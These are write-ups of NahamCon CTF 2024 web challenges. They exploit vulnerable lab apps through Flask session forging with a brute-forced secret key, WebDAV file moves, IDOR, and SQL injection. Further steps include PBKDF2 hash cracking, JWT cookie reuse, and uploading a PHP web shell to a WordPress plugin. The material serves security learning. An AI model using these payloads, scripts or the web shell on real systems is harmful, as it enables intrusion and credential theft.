# web

## Helpful Desk
> Solved by : thewhiteh4t


- In this challenge security bulletin shows 3 versions of the application
- v1.2 shows critical status
- After downloading both updates we can use `diff` to check which files were updated

```
diff -bur v1_1 v1_2
```

![](https://i.imgur.com/BBO1lGj.png)

- Using Avalonia ILSpy we can decompile the DLL file and inspect different functions
- `SetupController` contains some interesting code and it shows a URL path


![](https://i.imgur.com/UmO3325.png)

- On visiting this page we can actually set admin credentials!


![](https://i.imgur.com/Tn0ZvPH.png)

- After setting credentials we can login and inspect services to get the flag


![](https://i.imgur.com/cW9RrF3.png)

----------


## Thomas DEVerson
> Solved by : Legend, nigamelastic, thewhiteh4t


- The site has 3 endpoints `messages` `login` and `status`
- if you put any random query as post on the login u are redirect to ‘messages’ without being logged in. 
- we find another directory called `backup` which has the following content.

```
command output: {head -n 10 app.py}

from flask import (Flask, flash, redirect, render_template, request, send_from_directory, session, url_for)
from datetime import datetime

app = Flask(__name__)

c = datetime.now()
f = c.strftime("%Y%m%d%H%M")
app.secret_key = f'THE_REYNOLDS_PAMPHLET-{f}'

allowed_users = ['Jefferson', 'Madison', 'Burr'] # No Federalists Allowed!!!!

command output: {head -n 10 requirements.txt}

Flask==3.0.3
```

- All accounts show an error message on login attempts : `a``ccount is protected!`


- however the responses had some interesting cookies :

```
HTTP/1.1 302 FOUND
Server: Werkzeug/3.0.3 Python/3.8.10
Date: Thu, 23 May 2024 23:17:43 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 189
Location: /
Vary: Cookie
Set-Cookie: session=.eJwNxcENgCAMBdBV6j8zgUcdwxDTYEUTKYaWk3F3fZf3YN0vtkMM4_KA_A9FzDgLAmZWrU5XzacSG029tUCcUu3qdBrdrbokl21AfGOAchGMyF3M8X7pNCAR.Zk_Olw.CgFkkfYZmHi5O8_eaqSwj7VohO8; HttpOnly; Path=/
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
```

- these look like JWT but these are slightly different
- flask cookies can be decoded using `flask-unsign` tool
- for example cookies on the homepage can be decoded like this : 

```
> flask-unsign --cookie 'eyJuYW1lIjoiZ3Vlc3QifQ.ZlDcbw.D5h97i6PYmF5THUXwBgTVzPXMbU' --decode
{'name': 'guest'}
```

- although the cookie can be read but it is signed, if we want to manipulate the cookie we need a `secret key` which was used in the app to sign the new new cookie
- going back to `/backup` we can see how the app generated the secret key :

```python
c = datetime.now()
f = c.strftime("%Y%m%d%H%M")
app.secret_key = f'THE_REYNOLDS_PAMPHLET-{f}'
```

- and lets also take a look at the `/status` endpoint :

```
System healthy! Computing uptime... 82817 days 9 hours 48 minutes
```

- here the hint is that app was started once and it is running without fail
- we can roughly calculate the launch time using the following logic : 

```
launch time = current time - uptime
```

- this can easily be done using a python script but we wont get the exact time the key was generated because app launch and key generation will have different timings depending on multiple factors so we need to adjust the launch time a bit to get the exact key generation time

```
#!/usr/bin/env python3

import requests
from datetime import datetime, timedelta

base_url = 'http://challenge.nahamcon.com'
port = 30311
path = 'status'

url = f'{base_url}:{port}/{path}'
rqst = requests.get(url)

resp = rqst.text.split('\n')[1].split(' ')

days = int(resp[0])
hours = int(resp[2])
mins = int(resp[4])

uptime = timedelta(days=days, hours=hours, minutes=mins)

current_time = datetime.now()

launch_time = current_time - uptime

with open('list.txt', 'w') as outfile:
        for i in range(0, 1000):
                forward_time = launch_time - timedelta(minutes=i)
                format_time = forward_time.strftime("%Y%m%d%H%M")
                key = f'THE_REYNOLDS_PAMPHLET-{format_time}'
                outfile.write(key + '\n')
```

![](https://i.imgur.com/yPpAVlm.png)

- so now we have a list of possible keys which we can test using `flask-unsign` :


![](https://i.imgur.com/KzAzrbN.png)

- SECRET_KEY : `THE_REYNOLDS_PAMPHLET-179708250845`
- now we can easily modify the cookie and use any of the allowed usernames to read `/messages`

```
> flask-unsign --cookie "{'name': 'Burr'}" --sign --secret 'THE_REYNOLDS_PAMPHLET-179708250845'
eyJuYW1lIjoiQnVyciJ9.ZlDfmg.x3PYD73ZIkbVJhdpJ4c8UdYfGyg
```

![](https://i.imgur.com/IBfF7Bi.png)

----------


## The Davinci Code
> Solved by : thewhiteh4t


- In this challenge the application is a simple flask website with two public endpoints
- `/code` and `/static/<filename>`
- `/code` is supposed to render `code.html` but it looks like that file is not present so we are presented with werkzeug debug page
- After some basic recon of the application we can see that an interesting HTTP method is available :


![](https://i.imgur.com/hxDQfxO.png)

- PROPFIND — used to retrieve properties, stored as XML, from a web resource. It is also overloaded to allow one to retrieve the collection structure (a.k.a. directory hierarchy) of a remote system.
- https://learn.microsoft.com/en-us/previous-versions/office/developer/exchange-server-2003/aa142960(v=exchg.65)
- So using PROPFIND with curl we can actually get the file listing on the server!


![](https://i.imgur.com/T6rNf2L.png)

```xml
<D:multistatus
        xmlns:D="DAV:">
        <D:response>
                <D:href>/</D:href>
                <D:propstat>
                        <D:prop>
                                <D:message>WebDAVinci Code</D:message>
                                <D:directory>True</D:directory>
                        </D:prop>
                        <D:status>HTTP/1.1 200 OK</D:status>
                </D:propstat>
        </D:response>
        <D:response>
                <D:href>/__pycache__</D:href>
                <D:propstat>
                        <D:prop>
                                <D:displayname>__pycache__</D:displayname>
                        </D:prop>
                        <D:status>HTTP/1.1 200 OK</D:status>
                </D:propstat>
        </D:response>
        <D:response>
                <D:href>/templates</D:href>
                <D:propstat>
                        <D:prop>
                                <D:displayname>templates</D:displayname>
                        </D:prop>
                        <D:status>HTTP/1.1 200 OK</D:status>
                </D:propstat>
        </D:response>
        <D:response>
                <D:href>/app.py</D:href>
                <D:propstat>
                        <D:prop>
                                <D:displayname>app.py</D:displayname>
                        </D:prop>
                        <D:status>HTTP/1.1 200 OK</D:status>
                </D:propstat>
        </D:response>
        <D:response>
                <D:href>/static</D:href>
                <D:propstat>
                        <D:prop>
                                <D:displayname>static</D:displayname>
                        </D:prop>
                        <D:status>HTTP/1.1 200 OK</D:status>
                </D:propstat>
        </D:response>
        <D:response>
                <D:href>/the_secret_dav_inci_code</D:href>
                <D:propstat>
                        <D:prop>
                                <D:displayname>the_secret_dav_inci_code</D:displayname>
                        </D:prop>
                        <D:status>HTTP/1.1 200 OK</D:status>
                </D:propstat>
        </D:response>
</D:multistatus>
```

- immediately we can see `/the_secret_dav_inci_code`, here is what happens if we request PROPFIND on this path :

```
> curl -X PROPFIND http://challenge.nahamcon.com:30365/the_secret_dav_inci_code
<D:multistatus xmlns:D="DAV:"><D:response><D:href>/the_secret_dav_inci_code</D:href><D:propstat><D:prop><D:message>WebDAVinci Code</D:message><D:directory>True</D:directory></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response><D:response><D:href>/the_secret_dav_inci_code/flag.txt</D:href><D:propstat><D:prop><D:displayname>flag.txt</D:displayname></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>
```

```xml
<D:multistatus
        xmlns:D="DAV:">
        <D:response>
                <D:href>/the_secret_dav_inci_code</D:href>
                <D:propstat>
                        <D:prop>
                                <D:message>WebDAVinci Code</D:message>
                                <D:directory>True</D:directory>
                        </D:prop>
                        <D:status>HTTP/1.1 200 OK</D:status>
                </D:propstat>
        </D:response>
        <D:response>
                <D:href>/the_secret_dav_inci_code/flag.txt</D:href>
                <D:propstat>
                        <D:prop>
                                <D:displayname>flag.txt</D:displayname>
                        </D:prop>
                        <D:status>HTTP/1.1 200 OK</D:status>
                </D:propstat>
        </D:response>
</D:multistatus>
```

- so now we know where the flag is but PROPFIND does not let us read files so we need to enumerate more…


```
> curl -X PROPFIND http://challenge.nahamcon.com:30365/templates
<D:multistatus xmlns:D="DAV:"><D:response><D:href>/templates</D:href><D:propstat><D:prop><D:message>WebDAVinci Code</D:message><D:directory>True</D:directory></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response><D:response><D:href>/templates/index.html</D:href><D:propstat><D:prop><D:displayname>index.html</D:displayname></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>
```

- so we can see that `code.html` is missing under templates directory

```
> curl -X PROPFIND http://challenge.nahamcon.com:30365/static
<D:multistatus xmlns:D="DAV:"><D:response><D:href>/static</D:href><D:propstat><D:prop><D:message>WebDAVinci Code</D:message><D:directory>True</D:directory></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response><D:response><D:href>/static/logo01.png</D:href><D:propstat><D:prop><D:displayname>logo01.png</D:displayname></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response><D:response><D:href>/static/app.py.backup</D:href><D:propstat><D:prop><D:displayname>app.py.backup</D:displayname></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>
```

- juicy file spotted : `/static/app.py.backup` !!

```python
from flask import Flask, request, Response, render_template, abort, send_from_directory
import xml.etree.ElementTree as ET
import os
import shutil

app = Flask(__name__)
os.makedirs('static', exist_ok=True)

@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)

def create_webdav_response(endpoint, properties, children=None):
    root = ET.Element('D:multistatus', {'xmlns:D': 'DAV:'})
    response = ET.SubElement(root, 'D:response')
    href = ET.SubElement(response, 'D:href')
    href.text = endpoint
    propstat = ET.SubElement(response, 'D:propstat')
    prop = ET.SubElement(propstat, 'D:prop')
    for key, value in properties.items():
        element = ET.SubElement(prop, f'D:{key}')
        element.text = value
    status = ET.SubElement(propstat, 'D:status')
    status.text = 'HTTP/1.1 200 OK'

    if children:
        for child in children:
            child_response = ET.SubElement(root, 'D:response')
            child_href = ET.SubElement(child_response, 'D:href')
            child_href.text = os.path.join(endpoint, child)
            child_propstat = ET.SubElement(child_response, 'D:propstat')
            child_prop = ET.SubElement(child_propstat, 'D:prop')
            child_name = ET.SubElement(child_prop, 'D:displayname')
            child_name.text = child
            child_status = ET.SubElement(child_propstat, 'D:status')
            child_status.text = 'HTTP/1.1 200 OK'

    return ET.tostring(root, encoding='utf-8', method='xml')

@app.route('/<path:path>', methods=['GET', 'PROPFIND', 'MOVE'])
def handle_webdav(path):
    full_path = os.path.join(os.getcwd(), path)
    if request.method == 'PROPFIND':
        if os.path.exists(full_path):
            properties = {'message': 'WebDAVinci Code'}
            children = None
            if os.path.isdir(full_path):
                properties['directory'] = 'True'
                children = os.listdir(full_path)
            else:
                properties['file'] = 'True'
            xml_response = create_webdav_response('/' + path, properties, children)
            return Response(xml_response, mimetype='application/xml')
        abort(404)
    elif request.method == 'MOVE':
        destination = request.headers.get('Destination')
        if destination:
            destination_path = os.path.join(os.getcwd(), destination.strip('/'))
            os.makedirs(os.path.dirname(destination_path), exist_ok=True)
            shutil.move(full_path, destination_path)
            return Response(status=204)
        abort(405)
    abort(404)

@app.route('/code')
def code():
    return render_template("code.html")

@app.route('/', methods=['GET', 'PROPFIND'])
def index():
    if request.method == 'GET':
        return render_template('index.html')
        
    elif request.method == 'PROPFIND':
        properties = {'message': 'WebDAVinci Code'}
        children = None
        properties['directory'] = 'True'
        children = os.listdir(os.getcwd())
        xml_response = create_webdav_response('/', properties, children)
        return Response(xml_response, mimetype='application/xml')
    else:
        abort(405)


if __name__ == '__main__':
    app.run(debug=True, port=5000)
```


- and now we know all the routes and how the backend is handling inputs
- we can see another method `MOVE`

```python
elif request.method == 'MOVE':
        destination = request.headers.get('Destination')
        if destination:
            destination_path = os.path.join(os.getcwd(), destination.strip('/'))
            os.makedirs(os.path.dirname(destination_path), exist_ok=True)
            shutil.move(full_path, destination_path)
            return Response(status=204)
```

- we can add `Destination` header in our curl request and it looks like we can move files around using this method
- now if we recall `code.html` is missing, so we can move `/the_secret_dav_inci_code/flag.txt` to `templates/code.html`
- since we already have a defined route `/code` which renders `code.html` we should be able to read flag.txt


![](https://i.imgur.com/1qjXLSI.png)

- now lets look at `/code`


![](https://i.imgur.com/XheR1JI.png)



----------


## All About Robots
> Solved by: Legend


- This challenge is clear with name that we need to check `robots.txt` file. Even the homepage contained images showing `robots`.
![](https://i.imgur.com/u13IuiO.png)

- So first thing I visited the file and got one `Disallow` path.
![](https://i.imgur.com/laHlqTI.png)

- After visiting `/open_the_pod_bay_doors_hal_and_give_me_the_flag.html`, I got the flag.
![](https://i.imgur.com/oMT5W03.png)

```
flag{3f19b983c1de42bd49af1a237d7e57b9}
```

----------


## iDoor
> Solved by: Legend


- This one also is very clear with the name that we need to find the IDOR. And the challenge description has given the hint that they are using `SHA256` algorithm to create the reference objects.


![](https://i.imgur.com/mLRT5Fy.png)

- We are a customer with `ID: 11` and reference id is `4fc82b26aecb47d2868c4efbe3581732a3e7cbcc6c2efb32062c08170a05eeb8`


- I confirmed that `11`'s refence object will give the same hash if encoded with `SHA256` or not. We can use `openssl` or any other relevant tool.
![](https://i.imgur.com/BABNf8E.png)

- The hash was same so I started with `0` and replaced my hash with new one.
![](https://i.imgur.com/CDT4BWw.png)

- Using `0` only gave us the hash `5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9` which got us the flag.
![](https://i.imgur.com/ykIL1iO.png)

```
flag{770a058a80a9bca0a87c3e2ebe1ee9b2}
```

----------
## The Hacker Webstore
> Solved by: Starlord

Mirror : <a href="https://synthweb.ch/blog/nahamcon-ctf-2024/the-hacker-webstore">https://synthweb.ch/blog/nahamcon-ctf-2024/the-hacker-webstore</a>

![challenge description](https://i.imgur.com/TNLkY9J.png)


As we visit the challenge page, we can see an online store, which sells products aimed at hacker stereotypes.
There are 2 endpoints:

- / for products
- /create to create products
- /admin to login to the website’s back-end

Since we can create products I tried breaking one of 3 inputs by adding `'``)` to one of them, which returned this very helpful error, which helped understand what was going on.

![products page with sql error](https://i.imgur.com/Iy17z9A.png)


the following payload inserted in the description field did the trick for me:

```
lord') UNION SELECT * FROM users/*
```

This will show everything from the table `users` and comment out the rest of the line.


![uncrackable hashes](https://i.imgur.com/FTE7qtQ.png)


From there it was just a matter of cracking the hashes. But it turned out to be more complicated than usual:
As per research, we found out that hashcat and john the ripper, 2 most commonly used tools for cracking hashes, had multiple ways of cracking pbkdf2 sha256 hashes, but none of them had a working function for our specific current hash format.
We managed to identify the different parts of the hash thanks to reddit and stack overflow posts which looks like this:

    pbkdf2:sha256:<iterations amount>$<Salt>$<hash>

After trying desperately with modes 10900, 10000, 1460, the hashes were not cracking.

Remember, we have 2000 potential passwords in a list given in the challenge description, so even if we have 600k iterations, it shouldn’t take too long.

I ended up making my own decryption tool:

- crack.py

```python
import hashlib

def crack_pbkdf2_sha256_hash(password_list_file, target_hash, salt, iterations):
    with open(password_list_file, 'r') as file:
        passwords = file.read().splitlines()
    
    for password in passwords:
        # make PBKDF2-HMAC-SHA256
        dk = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), iterations)
        print(f"Trying password: {password}")
        
        # match check
        if dk.hex() == target_hash:
            print(f"Password found: {password}")
            return password
    
    print("Password not found in the provided list.")
    return None

# hash details for website_admin_account as retrieved from database
target_hash = "b2adfafaeed459f903401ec1656f9da36f4b4c08a50427ec7841570513bf8e57"
salt = "MSok34zBufo9d1tc"
iterations = 600000
password_list_file = "password_list.txt"

crack_pbkdf2_sha256_hash(password_list_file, target_hash, salt, iterations)
```

I made sure it would print each password to be able to visually confirm progress, as shown below:

![password found](https://i.imgur.com/FCaLxvU.png)


With this, I could then authenticate at /admin and see the flag:

![flag discovered](https://i.imgur.com/of6ycSh.png)

```
flag{87257f24fd71ea9ed8aa62837e768ec0}
```

----------

## The Mission Part 1 - Knock Knock
> Solved by: Starlord

Mirror : <a href="https://synthweb.ch/blog/nahamcon-ctf-2024/the-mission-part-1-knock-knock">https://synthweb.ch/blog/nahamcon-ctf-2024/the-mission-part-1-knock-knock</a>


This challenge was the first of 7 challenges on the same blackbox, which meant we had permission to fuzz and bruteforce if needed.

Upon connecting to the challenge, we are redirected to the url: `/app/login` , which shows a register button as well. Registering a user was an interesting task, as I could not register from any other domain than `nahamcon.ctf`. This was a bummer since the app required validation by mail to activate the user account just created.


![validation required](https://i.imgur.com/CiCl37a.png)


Upon further enumeration, I noticed `/app/logout` was redirecting to `/dev-app`, which opened a new avenue for my progress. 

![finding enpoints](https://i.imgur.com/48qm0MO.png)


Registering a user there proved more successful and didn’t have validation, which gave me a cookie named `dev-token`. It took me quite some time before realising that the logout option, if used on the `/app` side, would actually send a delete request for the correct cookie name for production.


![production cookie name](https://i.imgur.com/EPaJ6f8.png)


With the correct cookie name, it was then possible to simply reuse the jwt cookie obtained on the dev-app and reuse it in the production app, by changing its name in the browser tools or burp.

```
token-for-prod=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozfQ.MVXc0x_5qMYMmU3orSxp7HfC1FOB9FXuutII-AP_eno
```

With that in hand, we now can be identified as an authenticated user in the dashboard, even though it’s unavailable for maintenance.

![authentication succesful](https://i.imgur.com/bP1aHY4.png)


Expanding on previous findings, since we now had a username, I wanted to see his details so I visited the following and caught the flag!

```
/app/api/me
```

![flag found](https://i.imgur.com/3KT3Fb1.png)

```
flag{925f2f867c0f46d986979c935aafca31}
```

----------


## My Shop Disaster
> Solved too late by: Starlord

Mirror : <a href="https://synthweb.ch/blog/nahamcon-ctf-2024/my-shop-disaster">https://synthweb.ch/blog/nahamcon-ctf-2024/my-shop-disaster</a>


This is another write-up for posterity, even though it was solved after the competition.


![challenge description](https://i.imgur.com/ekDMsYY.png)


This is a fresh Wordpress install with Woocommerce and another plugin that needs to be reviewed for security, which is a typical real life scenario I encounter frequently in my line of work.


Here is the latest twenty-twenty-four theme from Wordpress, with Woocommerce and a twist:


![twenty-twenty-four theme by wordpress](https://i.imgur.com/P2Bnk7d.png)


We can quickly find a `/my-account/` endpoint, which is a login page.


![Login endpoint](https://i.imgur.com/KqOyEYT.png)


We have the plugin in a zip archive to pry open. Time to read and understand a lot of PHP. One of the first things I found out about was the possibility to enable user registration from one of the plugin’s rest-endpoint:


- challenge-custom/woo-variations/includes/class-woo-variations-rest-api.php (partial):

```
function register_customer_registration_disable() {
        register_rest_route( 'woo-variations/v1', '/registration-disable/', array(
                'methods'  => 'GET',
                'callback' => array($this, 'registration_disable'),
                'args'     => array(
                        'data' => array(
                        'required' => false,
                        'default'  => array(),
                        )
                )
         ));
}

function registration_disable( $data ) {
        update_option( 'users_can_register', 0 );
        wp_send_json('Customer registration disabled');
}

function register_customer_registration_enable() {
        register_rest_route( 'woo-variations/v1', '/registration-enable/', array(
                'methods'  => 'GET',
                'callback' => array($this, 'registration_enable'),
                'args'     => array(
                        'data' => array(
                        'required' => false,
                        'default'  => array(),
                        )
                )
         ));
}
```

This shows us we have a woo-variations api endpoint we can call for 2 actions:

- registration_disable
- registration_enable

That’s when practice actually helped me in real time, as I knew we could call api endpoints from `/wp-json/`. Making a request to the following url allowed to use the ‘feature’:

```
http://localhost:8686/wp-json/woo-variations/v1/registration-enable
```

![Customer registration enabled](https://i.imgur.com/xYazrB7.png)


Next step, I immediately retried to visit `/wp-admin`, and this time instead of a custom login page, I saw the usual Wordpress login, with the expected ‘Register’ button. Here’s the customer dashboard:


![Customer dashboard](https://i.imgur.com/MgQE3tC.png)


At this point, there was another part of the code that was problematic in a security perspective:


- challenge-custom/woo-variations/includes/class-woo-variations-backend.php (partial)

```
function check_permission() {

        if ( !current_user_can( "manage_options" ) && strpos( wp_get_current_user()->user_login, 'admin' ) === false )
        {
                 return false;
        }

        return true;
}
```

We can see the code checks for 2 conditions to be true, and that the second check is actually just looking for the string ‘admin’ in the username. 


> The strpos() function finds the position of the first occurrence of a string inside another string. Note: The strpos() function is case-sensitive.
> 
> https://www.w3schools.com/php/func_string_strpos.asp

So the best thing to do now is to create a user with a login username that contains the word ‘admin’ such as admin-starlord, which allowed me to access features from the backend. I tried modifiying my current username by clicking the account details, but that didn’t work. I needed a new user:


![admin in username trick](https://i.imgur.com/OjgUARk.png)


The next interesting feature was `set_gallery_picture`, because it allows to upload a file to the wordpress installation:

- challenge-custom/woo-variations/includes/class-woo-variations-backend.php (partial)

```
public function set_gallery_picture() {

        if ( !is_admin() || !$this->check_permission() )
        {
                wp_send_json( 'Unauthorized!' );
        }

        $product_id = isset( $_POST['product_id'] ) ? intval( $_POST['product_id'] ) : 0;

        // Verify that the product exists and is a WooCommerce product
        if ( $product_id && function_exists( 'wc_get_product' ) ) {

                if ( $_FILES && isset( $_FILES['gallery_picture'] ) ) {

                        $file = $_FILES['gallery_picture'];
                        $file_type = wp_check_filetype( basename( $file['name'] ), array( 'jpg', 'jpeg', 'png' ) );

                        $upload_dir = wp_upload_dir();
                        $upload_path = $upload_dir['basedir'] . '/woo-gallery/';
                        if ( !file_exists( $upload_path ) ) {
                                wp_mkdir_p( $upload_path );
                        }

                        if (move_uploaded_file( $file['tmp_name'], $upload_path . sanitize_file_name($file['name']) ) ) {

                                $file_url = $upload_dir['baseurl'] . '/woo-gallery/' . sanitize_file_name($file['name']);

                                if (function_exists( 'wc_gallery_set_attachment_from_url' ) )
                                {
                                        $attachment_id = wc_gallery_set_attachment_from_url( $file_url, $product_id);
                                        if ( $attachment_id) {
                                                echo json_encode(array( 'success' => true, 'message' => 'Gallery picture uploaded successfully.' ) );
                                        } else {
                                                echo json_encode(array( 'success' => false, 'message' => 'Error adding attachment to product gallery.' ) );
                                        }
                                }
                                else {
                                        echo json_encode(array( 'success' => false, 'message' => 'Error adding attachment to Woocommerce product.' ) );
                                }

                        } else {
                                echo json_encode(array( 'success' => false, 'message' => 'Error uploading file.' ) );
                        }
                } else {
                        echo json_encode(array( 'success' => false, 'message' => 'No file uploaded.' ) );
                }
        } else {
                echo json_encode(array( 'success' => false, 'message' => 'Invalid product ID.' ) );
        }
}
```

We actually don’t have to worry about the first `is_admin()` check, because this function will return true whenever the current URL is for a page on the admin side of WordPress, so no need for more privilege either, in order to upload a file. To do so, I used burpsuite, and it’s very useful `Change body encoding` feature, to have it automatically encode in multipart format, automatically setting the correct boundary header and Content-Type.


![Change body encoding](https://i.imgur.com/peGdJ5x.png)


But how do we use it? when we used the wp-json api earlier, this time it wouldn’t work, because in fact it had been added as a wp-ajax action:


```
public function hooks() {
        add_filter( 'getmoreplugins_get_settings_pages', array( $this, 'init_settings' ) );

        add_filter( 'plugin_action_links_' . plugin_basename( WOO_VARIATIONS_PLUGIN_FILE ), array(
                $this,
                'plugin_action_links'
        ) );

        add_action( 'admin_enqueue_scripts', array( $this, 'admin_enqueue_scripts' ) );
        add_action( 'admin_footer', array( $this, 'admin_template_js' ) );

        add_action( 'wp_ajax_associate_product_variation', array( $this, 'associate_product_variation' ) );
        add_action( 'wp_ajax_nopriv_associate_product_variation', array( $this, 'associate_product_variation' ) );

        add_action( 'wp_ajax_set_gallery_picture', array( $this, 'set_gallery_picture' ) );
        add_action( 'wp_ajax_nopriv_set_gallery_picture', array( $this, 'set_gallery_picture' ) );

        add_action( 'woocommerce_save_product_variation', array( $this, 'save_product_variation' ), 10, 2 );
        add_action( 'woocommerce_product_after_variable_attributes', array( $this, 'gallery_admin_html' ), 10, 3 );

        add_action( 'after_switch_theme', array( $this, 'remove_option' ), 20 );
                }
```

Basically this means we can call this action from :

```
http://localhost:8686/wp-admin/admin-ajax.php?action=set_gallery_picture&product_id=0&gallery_picture=
```

![](https://i.imgur.com/zpMwXXi.png)


By calling that url, we could manage to send a POST request with the correct parameters to upload a gallery_picture through Burpsuite. In order for the change body encoding option to work, I had to add `Content-Type: x-www-form-urlencoded`, and a filename for my payload as well:

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: challenge.nahamcon.com:port
Cookie: wordpress_b1fc8e0fa54a56c9a22d3b9c2fe67c92=admin-starlord%7C1716846545%7CumCgWrWQc1muc3GhFyIJpzpPbfCUIinVqP6KEeeMKQX%7Cf3f986009f4f4d1185ed6728024ca7ed031c5a2e0d7fa2911ce0352e9f7a943b
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoUIWKzm0piFTNvbB
Content-Length: 396

------WebKitFormBoundaryoUIWKzm0piFTNvbB
Content-Disposition: form-data; name="action"

set_gallery_picture
------WebKitFormBoundaryoUIWKzm0piFTNvbB
Content-Disposition: form-data; name="product_id"

1
------WebKitFormBoundaryoUIWKzm0piFTNvbB
Content-Disposition: form-data; name="gallery_picture"; filename="starlord.php"

<?php if (isset($_GET['cmd'])) system($_GET['cmd']); ?>
------WebKitFormBoundaryoUIWKzm0piFTNvbB--
```

If the error message changes it means the code went one level deeper at least, here’s the response:

```
{"success":false,"message":"Error adding attachment to Woocommerce product."}0
```

Regardless of the message, we know the file has already been uploaded, so we can just navigate to starlord.php and add the correct parameter:


![Flag for testing](https://i.imgur.com/ikUhXeF.png)


```
/wp-content/uploads/woo-gallery/starlord.php?cmd=cat /flag.txt
```

